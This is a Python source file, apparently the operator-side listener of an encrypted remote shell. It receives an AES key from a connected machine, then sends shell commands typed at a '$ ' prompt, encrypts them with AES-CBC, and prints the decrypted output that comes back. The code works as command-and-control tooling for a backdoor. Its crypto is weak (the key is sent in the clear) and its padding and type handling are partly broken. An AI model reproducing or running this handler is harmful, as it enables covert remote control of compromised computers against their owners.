import socket, base64, utils

from Crypto.Cipher import AES

class Connection:
    def __init__(self, conn: socket.socket) -> None:
        self.conn = conn
        self.key = conn.recv(32)
        self.listen()

    def send_command(self, cmd: str) -> None:
        self.conn.send(cmd)
    
    def pad(self, s: str):
        l = len(s)

        remainder = l // 16

        if remainder == 0: remainder = 32 - l
        else: remainder = ((remainder*2)*32) - l

        return s.encode() + (b'\x08' * remainder)

    def encrypt(self, msg: str, iv: bytes):
        padded_text = self.pad(msg)
        cipher_config = AES.new(self.key, AES.MODE_CBC, iv)    
        ciper = cipher_config.encrypt(padded_text)
        return base64.b64encode(ciper)

    def decrypt(self, msg: str, iv: bytes) -> str:
        msg = base64.b64decode(msg)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return utils.filter(cipher.decrypt(msg).decode())

    def listen(self) -> None:
        print("Key:", self.key.decode())

        while True:
            x = input("$ ")

            nonce = utils.getRandomString(16).encode()
            enc = self.encrypt(x, nonce)
            self.send_command(enc + b"|" + nonce + b"\n")

            if x == "exit:":
                print("[i] Closed connection")
                break

            msg, nonce = self.conn.recv(1024).decode().split("|")

            print(self.decrypt(msg, nonce.encode()))

        exit(0)